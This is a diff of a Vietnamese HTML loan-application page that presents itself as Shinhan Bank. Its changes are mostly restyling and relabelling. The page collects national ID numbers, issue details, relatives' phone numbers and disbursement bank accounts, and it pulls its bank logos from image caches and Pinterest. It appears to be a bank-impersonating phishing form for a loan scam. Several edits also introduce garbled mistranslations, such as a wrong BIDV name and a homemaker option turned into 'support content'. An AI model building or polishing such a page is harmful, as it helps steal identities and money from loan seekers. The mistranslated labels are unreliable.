@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shinhan Bank - Nhập Thông Tin</title>
+    <title>Ngân hàng Shinhan - Nhập thông tin</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
@@ -13,11 +13,11 @@
             font-family: 'Roboto', sans-serif;
             font-size: 16px;
             margin: 0;
-            background-color: #f8f9fa;
+            background: #f8f9fa;
         }
         .header {
             padding: 15px;
-            background-color: #fff;
+            background: #fff;
             border-bottom: 1px solid #b3cde0;
             display: flex;
             justify-content: space-between;
@@ -56,14 +56,14 @@
             justify-content: space-around;
             margin-bottom: 15px;
             margin-top: 10px;
-            flex-wrap: nowrap;
+            flex-wrap: wrap;
         }
         .nav-tabs .nav-item {
             flex: 1;
             text-align: center;
         }
         .nav-tabs .nav-link {
-            background-color: #d3d3d3;
+            background: #d3d3d3;
             color: #fff;
             border-radius: 20px;
             padding: 8px 10px;
@@ -74,7 +74,7 @@
             white-space: nowrap;
         }
         .nav-tabs .nav-link.active {
-            background-color: #0033a0;
+            background: #0033a0;
             color: #fff;
         }
         @media (max-width: 767px) {
@@ -82,29 +82,29 @@
                 font-size: 10px;
                 padding: 6px 8px;
             }
-            .row-group {
-                flex-direction: column; /* Xếp dọc trên mobile để tránh lệch */
+            .form-row {
+                flex-direction: column;
                 gap: 10px;
             }
             .form-group {
-                width: 100%; /* Đảm bảo form-group chiếm toàn bộ chiều rộng */
-                padding: 0; /* Giảm padding để tránh tràn */
+                width: 100%;
+                padding: 0;
             }
             .custom-select-toggle, .custom-select-list {
-                width: 100%; /* Đảm bảo dropdown ngân hàng co giãn đầy đủ */
+                width: 100%;
             }
             .container {
-                padding: 10px; /* Giảm padding container cho mobile */
-                margin: 10px 2.5%; /* Giảm margin để tận dụng không gian */
+                padding: 10px;
+                margin: 10px 2.5%;
             }
             .header {
-                padding: 10px; /* Giảm padding header trên mobile */
+                padding: 10px;
             }
             .header img {
-                height: 30px; /* Giảm kích thước logo cho phù hợp */
+                height: 30px;
             }
             .header-icons i {
-                font-size: 20px; /* Giảm kích thước icon cho mobile */
+                font-size: 20px;
             }
         }
         .section-title {
@@ -121,7 +121,7 @@
             font-size: 14px;
             margin-bottom: 5px;
         }
-        .form-label span {
+        .form-label-span {
             color: #ff4d4f;
         }
         .form-control, .form-select {
@@ -141,7 +141,7 @@
         .form-control.valid, .form-select.valid {
             border-color: #0033a0 !important;
         }
-        .form-control.ultra-short {
+        .form-control.super-short {
             width: 60px;
         }
         .form-control.extra-short, .form-select.extra-short {
@@ -159,18 +159,18 @@
             width: 500px;
         }
         @media (max-width: 767px) {
-            .form-control.ultra-short, .form-control.extra-short, .form-control.short,
+            .form-control.super-short, .form-control.extra-short, .form-control.short,
             .form-control.medium, .form-control.long, .form-select {
                 width: 100% !important;
                 min-width: unset;
             }
         }
         .form-control:disabled, .form-control[readonly] {
-            background-color: #e0e7ff;
+            background: #e0e7ff;
         }
         .form-select {
             appearance: none;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .707.708l-6 6a.5.5 0 0 1-.707 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>');
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .707.708l-6 6a.5.5 0 0 1-.707 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>');
             background-repeat: no-repeat;
             background-position: right 10px center;
             background-size: 12px;
@@ -182,20 +182,20 @@
             margin-top: 5px;
         }
         .btn-primary {
-            background-color: #0033a0;
+            background: #0033a0;
             border: none;
             border-radius: 20px;
             padding: 8px 16px;
             font-weight: 700;
             font-size: 14px;
             font-family: 'Roboto', sans-serif;
-            transition: background-color 0.3s ease;
+            transition: background 0.3s ease;
         }
         .btn-primary:hover {
-            background-color: #0052cc;
+            background: #0052cc;
         }
         .footer {
-            background-color: #0033a0;
+            background: #0033a0;
             color: #fff;
             text-align: center;
             padding: 15px;
@@ -246,7 +246,7 @@
         }
         @media (max-width: 767px) {
             .button-group {
-                flex-direction: row;
+                flex-direction: column;
                 justify-content: center;
             }
             .button-group button {
@@ -264,17 +264,17 @@
             padding: 8px 12px;
         }
         .dropdown-menu a:hover {
-            background-color: #e6f0fa;
+            background: #e6f0fa;
             color: #0052cc;
         }
-        .row-group {
+        .form-row {
             display: flex;
             gap: 15px;
             align-items: flex-start;
             margin-bottom: 10px;
             flex-wrap: wrap;
         }
-        .row-group .form-group {
+        .form-row .form-group {
             flex: 1;
             border-bottom: 1px solid #d3d3d3;
             padding: 5px;
@@ -373,7 +373,7 @@
             border: 1px solid #d3d3d3;
         }
         .calculation-table th {
-            background-color: #e6f0fa;
+            background: #e6f0fa;
             font-weight: 500;
         }
         @media (max-width: 767px) {
@@ -434,7 +434,7 @@
 </head>
 <body>
     <div class="header">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" onerror="this.src='https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo'" alt="Shinhan Bank Logo">
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" onerror="this.src='https://via.placeholder.com/150x50?text=Logo Ngân hàng Shinhan'" alt="Logo Ngân hàng Shinhan">
         <div class="header-icons">
             <i class="bi bi-search" aria-label="Tìm kiếm"></i>
             <div class="dropdown">
@@ -466,19 +466,19 @@
             <div class="mb-2">
                 <label class="section-title">THÔNG TIN CÁ NHÂN</label>
                 <div class="form-group">
-                    <label class="form-label">Họ và Tên <span>*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Vui lòng ghi rõ họ và tên như trên CCCD"></i></label>
+                    <label class="form-label">Họ và Tên <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Vui lòng ghi rõ họ và tên như trên CCCD"></i></label>
                     <input type="text" class="form-control long" id="fullName" name="fullName" autocomplete="name" required>
                     <div class="invalid-feedback" id="fullNameError"></div>
                 </div>
 
-                <div class="row-group">
+                <div class="form-row">
                     <div class="form-group">
-                        <label class="form-label">Ngày sinh <span>*</span></label>
+                        <label class="form-label">Ngày sinh <span class="form-label-span">*</span></label>
                         <input type="text" class="form-control extra-short" id="dob" name="dob" autocomplete="bday" placeholder="dd/mm/yyyy" required>
                         <div class="invalid-feedback" id="dobError"></div>
                     </div>
                     <div class="form-group">
-                        <label class="form-label">Giới tính <span>*</span></label>
+                        <label class="form-label">Giới tính <span class="form-label-span">*</span></label>
                         <select class="form-select extra-short" id="gender" name="gender" autocomplete="sex" required>
                             <option value="">Chọn giới tính</option>
                             <option value="Nam">Nam</option>
@@ -490,38 +490,38 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Địa chỉ thường trú <span>*</span></label>
+                    <label class="form-label">Địa chỉ thường trú <span class="form-label-span">*</span></label>
                     <input type="text" class="form-control long" id="contactAddress" name="contactAddress" autocomplete="street-address" required>
                     <div class="invalid-feedback" id="contactAddressError"></div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Quê quán <span>*</span></label>
+                    <label class="form-label">Quê quán <span class="form-label-span">*</span></label>
                     <input type="text" class="form-control long" id="hometown" name="hometown" required>
                     <div class="invalid-feedback" id="hometownError"></div>
                 </div>
 
-                <div class="row-group">
+                <div class="form-row">
                     <div class="form-group">
-                        <label class="form-label">Quốc tịch <span>*</span></label>
+                        <label class="form-label">Quốc tịch <span class="form-label-span">*</span></label>
                         <input type="text" class="form-control extra-short" id="nationality" name="nationality" value="Việt Nam" required>
                         <div class="invalid-feedback" id="nationalityError"></div>
                     </div>
                     <div class="form-group">
-                        <label class="form-label">Ngày cấp <span>*</span></label>
+                        <label class="form-label">Ngày cấp <span class="form-label-span">*</span></label>
                         <input type="text" class="form-control extra-short" id="idIssueDate" name="idIssueDate" placeholder="dd/mm/yyyy" required>
                         <div class="invalid-feedback" id="idIssueDateError"></div>
                     </div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Số định danh cá nhân (CCCD/CMND) <span>*</span></label>
+                    <label class="form-label">Số định danh cá nhân (CCCD/CMND) <span class="form-label-span">*</span></label>
                     <input type="text" class="form-control short" id="cccd" name="cccd" autocomplete="off" required maxlength="12">
                     <div class="invalid-feedback" id="cccdError"></div>
                 </div>
 
                 <div class="form-group form-group-bordered">
-                    <label class="form-label">Nơi cấp <span>*</span></label>
+                    <label class="form-label">Nơi cấp <span class="form-label-span">*</span></label>
                     <select class="form-select long" id="issuePlace" name="issuePlace" required>
                         <option value="">Chọn nơi cấp</option>
                         <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
@@ -536,32 +536,34 @@
             <div class="mb-2">
                 <label class="section-title">THÔNG TIN ĐĂNG KÝ</label>
                 <div class="form-group">
-                    <label class="form-label">Số điện thoại <span>*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập số điện thoại bắt đầu bằng +84 hoặc 0 (10 chữ số)"></i></label>
+                    <label class="form-label">Số điện thoại <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập số điện thoại bắt đầu bằng +84 hoặc 0 (10 chữ số)"></i></label>
                     <input type="tel" class="form-control short" id="phone" name="phone" autocomplete="tel" required maxlength="13">
                     <div class="invalid-feedback" id="phoneError"></div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">E-mail <span>*</span></label>
+                    <label class="form-label">Email <span class="form-label-span">*</span></label>
                     <input type="email" class="form-control medium" id="email" name="email" autocomplete="email" required>
-                    <div class="form-note">Bạn sẽ nhận thông tin hồ sơ đăng ký về email này.</div>
+                    <div class="form-note">Bạn sẽ nhận được hồ sơ đăng ký về email này.</div>
                     <div class="invalid-feedback" id="emailError"></div>
                 </div>
 
-                <div class="row-group">
+                <div class="form-row">
                     <div class="form-group">
-                        <label class="form-label">Hình thức vay <span>*</span></label>
+                        <label class="form-label">Hình thức vay <span class="form-label-span">*</span></label>
                         <select class="form-select short" id="loanType" name="loanType" required>
                             <option value="">Chọn Hình thức vay</option>
                             <option value="Vay tín chấp">Vay tín chấp</option>
                             <option value="Vay thế chấp">Vay thế chấp</option>
-                            <option value="Vay thấu chi">Vay thấu chi</option>
+                            <option value="Vay mua nhà">Vay mua nhà</option>
+                            <option value="Vay mua xe">Vay mua xe</option>
+                            <option value="Vay tiêu dùng">Vay tiêu dùng</option>
                             <option value="Vay trả góp">Vay trả góp</option>
                         </select>
                         <div class="invalid-feedback" id="loanTypeError"></div>
                     </div>
                     <div class="form-group">
-                        <label class="form-label">Thời hạn vay yêu cầu <span>*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Chọn số tháng vay phù hợp"></i></label>
+                        <label class="form-label">Thời hạn vay yêu cầu <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Chọn số tháng vay phù hợp"></i></label>
                         <select class="form-select extra-short" id="loanTerm" name="loanTerm" required>
                             <option value="">Chọn số tháng</option>
                             <option value="6">6 tháng</option>
@@ -576,58 +578,58 @@
                     </div>
                 </div>
 
-                <div class="row-group">
+                <div class="form-row">
                     <div class="form-group">
-                        <label class="form-label">Số tiền vay yêu cầu (VND) <span>*</span></label>
+                        <label class="form-label">Số tiền vay yêu cầu (đồng) <span class="form-label-span">*</span></label>
                         <select class="form-select short" id="loanAmount" name="loanAmount" required>
                             <option value="">Chọn số tiền</option>
-                            <option value="10000000">10,000,000</option>
-                            <option value="20000000">20,000,000</option>
-                            <option value="30000000">30,000,000</option>
-                            <option value="40000000">40,000,000</option>
-                            <option value="50000000">50,000,000</option>
-                            <option value="60000000">60,000,000</option>
-                            <option value="70000000">70,000,000</option>
-                            <option value="80000000">80,000,000</option>
-                            <option value="90000000">90,000,000</option>
-                            <option value="100000000">100,000,000</option>
-                            <option value="150000000">150,000,000</option>
-                            <option value="200000000">200,000,000</option>
-                            <option value="300000000">300,000,000</option>
-                            <option value="400000000">400,000,000</option>
-                            <option value="500000000">500,000,000</option>
+                            <option value="10000000">10.000.000</option>
+                            <option value="20000000">20.000.000</option>
+                            <option value="30000000">30.000.000</option>
+                            <option value="40000000">40.000.000</option>
+                            <option value="50000000">50.000.000</option>
+                            <option value="60000000">60.000.000</option>
+                            <option value="70000000">70.000.000</option>
+                            <option value="80000000">80.000.000</option>
+                            <option value="90000000">90.000.000</option>
+                            <option value="100000000">100.000.000</option>
+                            <option value="150000000">150.000.000</option>
+                            <option value="200000000">200.000.000</option>
+                            <option value="300000000">300.000.000</option>
+                            <option value="400000000">400.000.000</option>
+                            <option value="500000000">500.000.000</option>
                             <option value="other">Khác</option>
                         </select>
                         <div class="invalid-feedback" id="loanAmountError"></div>
                     </div>
                     <div class="form-group" id="customLoanAmountGroup" style="display: none;">
-                        <label class="form-label">Số tiền vay tùy chỉnh (VND) <span>*</span></label>
+                        <label class="form-label">Số tiền vay tùy chỉnh (đồng) <span class="form-label-span">*</span></label>
                         <input type="text" class="form-control short" id="customLoanAmount" name="customLoanAmount" maxlength="18">
                         <div class="invalid-feedback" id="customLoanAmountError"></div>
                     </div>
                     <div class="form-group">
-                        <label class="form-label">Dự kiến giải ngân ngày <span>*</span></label>
+                        <label class="form-label">Dự kiến giải ngân <span class="form-label-span">*</span></label>
                         <input type="date" class="form-control extra-short" id="disbursementDate" name="disbursementDate" autocomplete="off" required>
                         <div class="invalid-feedback" id="disbursementDateError"></div>
                     </div>
                 </div>
 
-                <div class="row-group">
+                <div class="form-row">
                     <div class="form-group">
-                        <label class="form-label">Lãi suất (%/năm) <span>*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Lãi suất được tự động chọn theo gói vay"></i></label>
+                        <label class="form-label">Lãi suất (%/năm) <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Lãi suất được tự động chọn theo gói vay"></i></label>
                         <input type="number" class="form-control extra-short" id="interestRate" name="interestRate" step="0.01" required readonly>
                         <div class="invalid-feedback" id="interestRateError"></div>
                     </div>
                     <div class="form-group">
-                        <label class="form-label">Thu nhập hàng tháng (VND) <span>*</span></label>
+                        <label class="form-label">Thu nhập hàng tháng (đồng) <span class="form-label-span">*</span></label>
                         <input type="text" class="form-control extra-short" id="monthlyIncome" name="monthlyIncome" required>
                         <div class="invalid-feedback" id="monthlyIncomeError"></div>
                     </div>
                 </div>
 
-                <div class="row-group">
+                <div class="form-row">
                     <div class="form-group">
-                        <label class="form-label">Nghề nghiệp <span>*</span></label>
+                        <label class="form-label">Nghề nghiệp <span class="form-label-span">*</span></label>
                         <select class="form-select short" id="occupation" name="occupation" required>
                             <option value="">Chọn nghề nghiệp</option>
                             <option value="Kỹ sư">Kỹ sư</option>
@@ -635,14 +637,14 @@
                             <option value="Giáo viên">Giáo viên</option>
                             <option value="Bác sĩ">Bác sĩ</option>
                             <option value="Kinh doanh">Kinh doanh</option>
-                            <option value="Nội trợ">Nội trợ</option>
+                            <option value="Nội dung hỗ trợ">Nội dung hỗ trợ</option>
                             <option value="Hưu trí">Hưu trí</option>
                             <option value="Khác">Khác</option>
                         </select>
                         <div class="invalid-feedback" id="occupationError"></div>
                     </div>
                     <div class="form-group">
-                        <label class="form-label">Mục đích vay <span>*</span></label>
+                        <label class="form-label">Mục đích vay <span class="form-label-span">*</span></label>
                         <select class="form-select short" id="loanPurpose" name="loanPurpose" required>
                             <option value="">Chọn mục đích vay</option>
                             <option value="Mua nhà">Mua nhà</option>
@@ -657,17 +659,17 @@
                     </div>
                 </div>
 
-                <div class="row-group">
+                <div class="form-row">
                     <div class="form-group">
-                        <label class="form-label">Số điện thoại người thân <span>*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập số điện thoại bắt đầu bằng +84 hoặc 0 (10 chữ số)"></i></label>
+                        <label class="form-label">Số điện thoại thân nhân <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập số điện thoại bắt đầu bằng +84 hoặc 0 (10 chữ số)"></i></label>
                         <input type="tel" class="form-control short" id="relativePhone" name="relativePhone" autocomplete="tel" required maxlength="13">
                         <div class="invalid-feedback" id="relativePhoneError"></div>
                     </div>
                     <div class="form-group">
-                        <label class="form-label">Quan hệ <span>*</span></label>
+                        <label class="form-label">Quan hệ <span class="form-label-span">*</span></label>
                         <select class="form-select short" id="relationship" name="relationship" required>
                             <option value="">Chọn quan hệ</option>
-                            <option value="Bạn bè">Bạn bè</option>
+                            <option value="Bạn bè">Bạn</option>
                             <option value="Anh">Anh</option>
                             <option value="Chị">Chị</option>
                             <option value="Em">Em</option>
@@ -687,178 +689,178 @@
             <div class="mb-2">
                 <label class="section-title">TÀI KHOẢN GIẢI NGÂN</label>
                 <div class="form-group">
-                    <label class="form-label">Tên chủ tài khoản <span>*</span></label>
+                    <label class="form-label">Tên tài khoản chủ <span class="form-label-span">*</span></label>
                     <input type="text" class="form-control long" id="accountName" name="accountName" autocomplete="name" required>
                     <div class="invalid-feedback" id="accountNameError"></div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Số tài khoản <span>*</span></label>
+                    <label class="form-label">Số tài khoản <span class="form-label-span">*</span></label>
                     <input type="text" class="form-control short" id="accountNumber" name="accountNumber" autocomplete="off" required maxlength="20">
                     <div class="invalid-feedback" id="accountNumberError"></div>
                 </div>
 
                 <div class="form-group form-group-bordered">
-                    <label class="form-label">Tên ngân hàng <span>*</span></label>
+                    <label class="form-label">Tên ngân hàng <span class="form-label-span">*</span></label>
                     <div class="custom-select" id="bank-select">
                         <div class="custom-select-toggle" tabindex="0" aria-expanded="false">
-                           <span>-- Chọn ngân hàng --</span>
+                           <span>--Chọn ngân hàng --</span>
                         </div>
                         <div class="custom-select-list">
                             <div class="custom-select-option" data-value="shinhan">
-                                <img src="https://storage.googleapis.com/housezy-2f8ee.appspot.com/images/entities/500/1694489220481.jpg" alt="Shinhan Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://storage.googleapis.com/housezy-2f8ee.appspot.com/images/entities/500/1694489220481.jpg" alt="Biểu trưng Ngân hàng Shinhan Việt Nam" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng Shinhan Việt Nam (Shinhanbank)
                             </div>
                             <div class="custom-select-option" data-value="vietcombank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSKfmg8stlijHEtnHcr6mzKL6-ZOakaHlxQ6Cl8uLaIJ7YaCA624VeA-Nxa8hJORjiN0Z4" alt="Vietcombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TMCP Ngoại Thương Việt Nam (Vietcombank)
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSKfmg8stlijHEtnHcr6mzKL6-ZOakaHlxQ6Cl8uLaIJ7YaCA624VeA-Nxa8hJORjiN0Z4" alt="Logo của Vietcombank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Ngoại Thương Việt Nam ( Vietcombank )
                             </div>
                             <div class="custom-select-option" data-value="vietinbank">
-                                <img src="https://i.pinimg.com/564x/0e/33/49/0e3349ab85ae5ebf604df3cb380f9c8f.jpg" alt="VietinBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TMCP Công Thương Việt Nam (VietinBank)
+                                <img src="https://i.pinimg.com/564x/0e/33/49/0e3349ab85ae5ebf604df3cb380f9c8f.jpg" alt="Logo VietinBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Công Thương Việt Nam ( VietinBank)
                             </div>
                             <div class="custom-select-option" data-value="bidv">
-                                <img src="https://play-lh.googleusercontent.com/g9KCglN_UhMUgccQxVg112tz3AAa0-ZqrgOkoKLtPe34-a6ZiOdzyW26hSWcqa-1sQ" alt="BIDV Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
-                                Ngân hàng TMCP Đầu tư và Phát triển Việt Nam (BIDV)
+                                <img src="https://play-lh.googleusercontent.com/g9KCglN_UhMUgccQxVg112tz3AAa0-ZqrgOkoKLtPe34-a6ZiOdzyW26hSWcqa-1sQ" alt="Biểu trưng của Ngân hàng BIDV" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Tư vấn và Phát triển Việt Nam (BIDV)
                             </div>
                             <div class="custom-select-option" data-value="techcombank">
-                                <img src="https://techcombank.com/content/dam/techcombank/public-site/seo/techcombank_logo_svg_86201e50d1.svg" alt="Techcombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://techcombank.com/content/dam/techcombank/public-site/seo/techcombank_logo_svg_86201e50d1.svg" alt="Biểu trưng Techcombank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Kỹ Thương Việt Nam (Techcombank)
                             </div>
                             <div class="custom-select-option" data-value="agribank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSu3s9LbPJqkaqT616sITYzyBYPaLHI2FzwDg&s" alt="Agribank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSu3s9LbPJqkaqT616sITYzyBYPaLHI2FzwDg&s" alt="Biểu trưng Agribank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng Nông nghiệp và Phát triển Nông thôn Việt Nam (Agribank)
                             </div>
                             <div class="custom-select-option" data-value="mbbank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSXmD_3PBoPHofJkAQ49sZr82DFZLHmYN9cfHLwoVxtLhNHWnvXNCDGJitDaTEeZSImOSs" alt="MB Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSXmD_3PBoPHofJkAQ49sZr82DFZLHmYN9cfHLwoVxtLhNHWnvXNCDGJitDaTEeZSImOSs" alt="Biểu trưng Ngân hàng MB" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Quân đội (MB Bank)
                             </div>
                             <div class="custom-select-option" data-value="vpbank">
-                                <img src="https://yt3.googleusercontent.com/_uwwTxJP2A_IA_MwU5fkDIcsLOXW1SmqNKfAxJZmVudOwp29NuPlm69So0P7I0B3s78X-5syQQ=s900-c-k-c0x00ffffff-no-rj" alt="VPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://yt3.googleusercontent.com/_uwwTxJP2A_IA_MwU5fkDIcsLOXW1SmqNKfAxJZmVudOwp29NuPlm69So0P7I0B3s78X-5syQQ=s900-ck-c0x00ffffff-no-rj" alt="Biểu trưng VPBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Việt Nam Thịnh Vượng (VPBank)
                             </div>
                             <div class="custom-select-option" data-value="vib">
-                                <img src="https://inkythuatso.com/uploads/thumbnails/800/2021/12/logo-vib-inkythuatso-3-21-13-44-34.jpg" alt="VIB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://inkythuatso.com/uploads/thumbnails/800/2021/12/logo-vib-inkythuatso-3-21-13-44-34.jpg" alt="Logo VIB" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Quốc tế Việt Nam (VIB)
                             </div>
                             <div class="custom-select-option" data-value="hdbank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRhn0wDaZ9SXY0_LxW746TbKXgeFpJKkwxejd6jSi_6lHSrHSMogb1zYSIcynwmQK7dOeE" alt="HDBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRhn0wDaZ9SXY0_LxW746TbKXgeFpJKkwxejd6jSi_6lHSrHSMogb1zYSIcynwmQK7dOeE" alt="Biểu trưng HDBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Phát triển TP.HCM (HDBank)
                             </div>
                             <div class="custom-select-option" data-value="ocb">
-                                <img src="https://whypay.vn/assets/images/nganhang/ocb.png" alt="OCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://whypay.vn/assets/images/nganhang/ocb.png" alt="Logo OCB" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Phương Đông (OCB)
                             </div>
                             <div class="custom-select-option" data-value="acb">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQW7j478Y5CAP5aulWNTxu8M46IjdgH5tVfww&s" alt="ACB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQW7j478Y5CAP5aulWNTxu8M46IjdgH5tVfww&s" alt="Biểu trưng ACB" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Á Châu (ACB)
                             </div>
                             <div class="custom-select-option" data-value="sacombank">
-                                <img src="https://play-lh.googleusercontent.com/UmnQk5GidbwIKmAKFFmrEPYjekyfB2gD_V1t2e-CDWGu_YlYDqpgs1moIsiouqEF=w240-h480-rw" alt="Sacombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://play-lh.googleusercontent.com/UmnQk5GidbwIKmAKFFmrEPYjekyfB2gD_V1t2e-CDWGu_YlYDqpgs1moIsiouqEF=w240-h480-rw" alt="Biểu trưng Sacombank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Sài Gòn Thương Tín (Sacombank)
                             </div>
                             <div class="custom-select-option" data-value="tpbank">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTL9Cpp1nDLbzIrK_-ljQsqJOGbytIiiDAgmQ&s" alt="TPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTL9Cpp1nDLbzIrK_-ljQsqJOGbytIiiDAgmQ&s" alt="Biểu trưng TPBank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Tiên Phong (TPBank)
                             </div>
                             <div class="custom-select-option" data-value="scb">
-                                <img src="https://play-lh.googleusercontent.com/z7gOit-6cq79jN3hcU-lquDoswKkIKjMYRWCpYKQ9yefkCCJBxn7DBIz0GFOmEg2mug=w600-h300-pc0xffffff-pd" alt="SCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://play-lh.googleusercontent.com/z7gOit-6cq79jN3hcU-lquDoswKkIKjMYRWCpYKQ9yefkCCJBxn7DBIz0GFOmEg2mug=w600-h300-pc0xffffff-pd" alt="Biểu trưng SCB" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Sài Gòn (SCB)
                             </div>
                             <div class="custom-select-option" data-value="msb">
-                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSUpmXz0eeUTJ_9uJFEp2fEy4tIWgNVN595yg&s" alt="MSB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSUpmXz0eeUTJ_9uJFEp2fEy4tIWgNVN595yg&s" alt="Biểu trưng MSB" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Hàng Hải Việt Nam (MSB)
                             </div>
                             <div class="custom-select-option" data-value="eximbank">
-                                <img src="https://whypay.vn/assets/images/nganhang/eximbank.png" alt="Eximbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                <img src="https://whypay.vn/assets/images/nganhang/eximbank.png" alt="Logo Eximbank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Ngân hàng TMCP Xuất Nhập khẩu Việt Nam (Eximbank)
                             </div>
-                            <div class="custom-select-option" data-value="seabank">
-                                <img src="https://whypay.vn/assets/images/nganhang/seabank.png" alt="SeABank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                            <div class="custom-select-option" data-value="ngân hàng biển">
+                                <img src="https://whypay.vn/assets/images/nganhang/seabank.png" alt="Logo SeABank" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
